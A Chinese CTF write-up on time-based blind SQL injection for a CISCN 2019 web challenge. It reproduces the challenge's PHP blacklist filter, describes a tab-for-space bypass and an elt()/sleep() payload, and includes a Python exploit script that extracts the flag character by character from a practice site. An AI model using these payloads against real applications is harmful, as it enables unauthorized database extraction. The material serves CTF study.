### SQL延时注入学习
这里借助一道ciscn2019华北半决赛的web题（day2web1），学习了一下SQL延时注入。（学习了一下北邮大佬的payload）

题目复现地址：http://web43.buuoj.cn/

北邮的payload:https://www.xd10086.com/posts/7008047528314442902/

#### 解题过程
题目只给了一个输入框，测试发现单引号没过滤，and，union，空格等都过滤了。测试过程很枯燥，干脆直接扔出关键代码。

```php
function safe($sql){
    #过滤的内容
    $blackList = array(' ','||','#','-',';','&','+','or','and','`','"','insert','group','limit','update','delete','*','into','union','load_file','outfile','./');
    foreach($blackList as $blackitem){
        if(stripos($sql,$blackitem)){
            return False;
        }
    }
    return True;
}
#为了凸显主要部分，代码做了删减
mysql_select_db("ctf",$db);
if(safe($id)){
    #只显示一行
    $query = mysql_query("SELECT content from passage WHERE id = ${id} limit 0,1");
    if($query){
        $result = mysql_fetch_array($query);
        if($result){
            echo $result['content'];
        }else{
            echo "Error Occured When Fetch Result.";
        }
    }else{
    	var_dump($query);
    }
}else{
    die("SQL Injection Checked.");
}
```

可以看出，没有过滤括号和select，因此可以使用一些函数，比如sleep。而且尽管过滤了空格，但是没有过滤tab，因此可以使用\t代替空格绕过对空格的过滤。

这里可以借助延时注入来绕过限制得到flag。
##### elt函数介绍
这里将借助elt函数来绕过。elt函数的原型为：

elt(n,str1,str2,str3)

该函数用于选取参数中第n个字符串，如果n是1，则结果是str1。但是如果是0，后面的参数不管是需要执行一个函数，或者直接是一个字符串，都不会执行，直接返回NULL。这个特性非常重要，接下来将借助该函数进行延时注入。下面将给出例子。

表结构
![表结构](https://markdown-1255584210.cos.ap-chengdu.myqcloud.com/sql_inject/users_table.png)
正常使用时
![正常使用](https://markdown-1255584210.cos.ap-chengdu.myqcloud.com/sql_inject/elt.png)
时间注入
![时间注入](https://markdown-1255584210.cos.ap-chengdu.myqcloud.com/sql_inject/timeinject.png)
第一个延时了，第二个直接返回NULL而没有延时。


#### 构造payload
可以构造如下payload
```txt
id=elt(left((select	flag	from	ctf),n)='xxx',sleep(1))
其中n代表选取了几个字符，xxx代表猜到的字符是什么。
```
#### 编写exp
借用了一下北邮大佬的exp，用Python2运行
```python
import requests
import time
url = "http://web43.buuoj.cn/index.php"
flag = ''
while True:
    for i in range(128):
        ss = time.time()
        data = {
            'id':'''ELT(left((select    flag    from    ctf),{})='{}{}',SLEEP(1))'''.format(len(flag)+1,flag, chr(i))
        }
        #print data
        requests.post(url,data=data)
        if time.time()-ss>=0.5:
            flag += chr(i)
            print flag
            break
```
>复现平台没有waf的话直接跑就行，有waf就自己搭一个试试吧。